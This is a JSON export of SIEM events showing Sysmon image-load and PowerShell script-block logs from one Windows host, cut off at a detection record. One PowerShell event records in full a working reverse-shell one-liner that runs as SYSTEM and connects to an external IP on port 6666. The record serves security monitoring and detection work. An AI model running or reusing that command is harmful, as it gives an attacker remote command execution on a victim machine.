    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:26.1849568Z\"},\"EventRecordID\":\"2436688\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:26.176\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\Microsoft.NET\\\\assembly\\\\GAC_64\\\\System.Transactions\\\\v4.0_4.0.0.0__b77a5c561934e089\\\\System.Transactions.dll\"},{\"Name\":\"FileVersion\",\"text\":\"4.8.9037.0 built by: NET481REL1\"},{\"Name\":\"Description\",\"text\":\".NET Framework\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae .NET Framework\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"system.transactions.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=C2A8030D86866AC007231DEC0AA81EE1,SHA256=78BAF438EA27532D67DBBF51293441B5847EC81657E2F028A7635BC4984C9DCE,IMPHASH=10C155ED8DDBD965BDA88609BD773C5C\"},{\"Name\":\"Signed\",\"text\":\"true\"},{\"Name\":\"Signature\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"SignatureStatus\",\"text\":\"Valid\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\microsoft.net\\assembly\\gac_64\\system.transactions\\v4.0_4.0.0.0__b77a5c561934e089\\system.transactions.dll",
      "object.process.hash": "IMPHASH:10C155ED8DDBD965BDA88609BD773C5C MD5:C2A8030D86866AC007231DEC0AA81EE1 SHA256:78BAF438EA27532D67DBBF51293441B5847EC81657E2F028A7635BC4984C9DCE",
      "object.process.hash.imphash": "10C155ED8DDBD965BDA88609BD773C5C",
      "object.process.hash.md5": "C2A8030D86866AC007231DEC0AA81EE1",
      "object.process.hash.sha256": "78BAF438EA27532D67DBBF51293441B5847EC81657E2F028A7635BC4984C9DCE",
      "object.process.meta": "Description:.NET Framework | Product:Microsoft\u00ae .NET Framework | Company:Microsoft Corporation",
      "object.process.name": "system.transactions.dll",
      "object.process.original_name": "system.transactions.dll",
      "object.process.path": "c:\\windows\\microsoft.net\\assembly\\gac_64\\system.transactions\\v4.0_4.0.0.0__b77a5c561934e089\\",
      "object.property": "signature status",
      "object.value": "Valid | Microsoft Corporation",
      "object.version": "4.8.9037.0 built by: NET481REL1",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:26.1840000Z",
      "uuid": "54df3ef0-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module system.transactions.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856703,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ef0-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:26.1840000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:26.2347609Z\"},\"EventRecordID\":\"248087\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0002-8b4b-6408953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"$client = New-Object System.Net.Sockets.TCPClient('3.5.140.10',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"},{\"Name\":\"ScriptBlockId\",\"text\":\"7a4bd33c-ba83-43b5-8efa-03013c1a81fd\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "7a4bd33c-ba83-43b5-8efa-03013c1a81fd",
      "object.process.cmdline": "$client = New-Object System.Net.Sockets.TCPClient('3.5.140.10',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
      "object.process.id": "7564",
      "object.value": "$client = New-Object System.Net.Sockets.TCPClient('3.5.140.10',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:26.2340000Z",
      "uuid": "5f7e837e-ad8f-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216134368709,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "5f7e837e-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:26.2340000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:26.2744394Z\"},\"EventRecordID\":\"2436689\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:26.270\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Microsoft.P521220ea#\\\\001b9d74c41c1025a97d986f6785c6bf\\\\Microsoft.PowerShell.Commands.Utility.ni.dll\"},{\"Name\":\"FileVersion\",\"text\":\"10.0.19041.3996\"},{\"Name\":\"Description\",\"text\":\"Microsoft Windows PowerShell Utility Commands\"},{\"Name\":\"Product\",\"text\":\"Microsoft (R) Windows (R) Operating System\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"Microsoft.PowerShell.Commands.Utility.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=BE6044412ADC1682E5DF8629B489BE12,SHA256=0C799277ED46EA7F75E263CADC1E2E2E5244D84DDDA7E5E36C2AC8D61199D4A2,IMPHASH=00000000000000000000000000000000\"},{\"Name\":\"Signed\",\"text\":\"false\"},{\"Name\":\"Signature\",\"text\":\"-\"},{\"Name\":\"SignatureStatus\",\"text\":\"Unavailable\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\001b9d74c41c1025a97d986f6785c6bf\\microsoft.powershell.commands.utility.ni.dll",
      "object.process.hash": "IMPHASH:00000000000000000000000000000000 MD5:BE6044412ADC1682E5DF8629B489BE12 SHA256:0C799277ED46EA7F75E263CADC1E2E2E5244D84DDDA7E5E36C2AC8D61199D4A2",
      "object.process.hash.imphash": "00000000000000000000000000000000",
      "object.process.hash.md5": "BE6044412ADC1682E5DF8629B489BE12",
      "object.process.hash.sha256": "0C799277ED46EA7F75E263CADC1E2E2E5244D84DDDA7E5E36C2AC8D61199D4A2",
      "object.process.meta": "Description:Microsoft Windows PowerShell Utility Commands | Product:Microsoft (R) Windows (R) Operating System | Company:Microsoft Corporation",
      "object.process.name": "microsoft.powershell.commands.utility.ni.dll",
      "object.process.original_name": "Microsoft.PowerShell.Commands.Utility.dll",
      "object.process.path": "c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\001b9d74c41c1025a97d986f6785c6bf\\",
      "object.property": "signature status",
      "object.value": "not signed",
      "object.version": "10.0.19041.3996",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:26.2740000Z",
      "uuid": "54df3ef1-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module microsoft.powershell.commands.utility.ni.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856704,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ef1-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:26.2740000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:26.2772254Z\"},\"EventRecordID\":\"2436690\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:26.270\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Confe64a9051#\\\\f84ab3a367cd4b1625fbe80fdfc5a8e0\\\\System.Configuration.Install.ni.dll\"},{\"Name\":\"FileVersion\",\"text\":\"4.8.9037.0 built by: NET481REL1\"},{\"Name\":\"Description\",\"text\":\".NET Framework\"},{\"Name\":\"Product\",\"text\":\"Microsoft\u00ae .NET Framework\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"System.Configuration.Install.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=8336DB2DBD3A207AF12F5A3AED2711B7,SHA256=EDB9907A2A09257E617EDA09AE5383BE90FF953AE58C26334F486CE15DB763EF,IMPHASH=00000000000000000000000000000000\"},{\"Name\":\"Signed\",\"text\":\"false\"},{\"Name\":\"Signature\",\"text\":\"-\"},{\"Name\":\"SignatureStatus\",\"text\":\"Unavailable\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.confe64a9051#\\f84ab3a367cd4b1625fbe80fdfc5a8e0\\system.configuration.install.ni.dll",
      "object.process.hash": "IMPHASH:00000000000000000000000000000000 MD5:8336DB2DBD3A207AF12F5A3AED2711B7 SHA256:EDB9907A2A09257E617EDA09AE5383BE90FF953AE58C26334F486CE15DB763EF",
      "object.process.hash.imphash": "00000000000000000000000000000000",
      "object.process.hash.md5": "8336DB2DBD3A207AF12F5A3AED2711B7",
      "object.process.hash.sha256": "EDB9907A2A09257E617EDA09AE5383BE90FF953AE58C26334F486CE15DB763EF",
      "object.process.meta": "Description:.NET Framework | Product:Microsoft\u00ae .NET Framework | Company:Microsoft Corporation",
      "object.process.name": "system.configuration.install.ni.dll",
      "object.process.original_name": "System.Configuration.Install.dll",
      "object.process.path": "c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.confe64a9051#\\f84ab3a367cd4b1625fbe80fdfc5a8e0\\",
      "object.property": "signature status",
      "object.value": "not signed",
      "object.version": "4.8.9037.0 built by: NET481REL1",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:26.2770000Z",
      "uuid": "54df3ef2-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module system.configuration.install.ni.dll on host wperry.dev.it.stf",
      "_checkpoint": 216133856705,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3ef2-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:26.2770000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:26.4439403Z\"},\"EventRecordID\":\"248088\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0002-8e4b-6408953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"{0}\"},{\"Name\":\"ScriptBlockId\",\"text\":\"dc5e58e1-cbe2-45c6-8b68-632712e00c88\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "dc5e58e1-cbe2-45c6-8b68-632712e00c88",
      "object.process.cmdline": "{0}",
      "object.process.id": "7564",
      "object.value": "{0}",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:26.4430000Z",
      "uuid": "5f7e837f-ad8f-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216134368710,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "5f7e837f-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:26.4430000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "detect",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
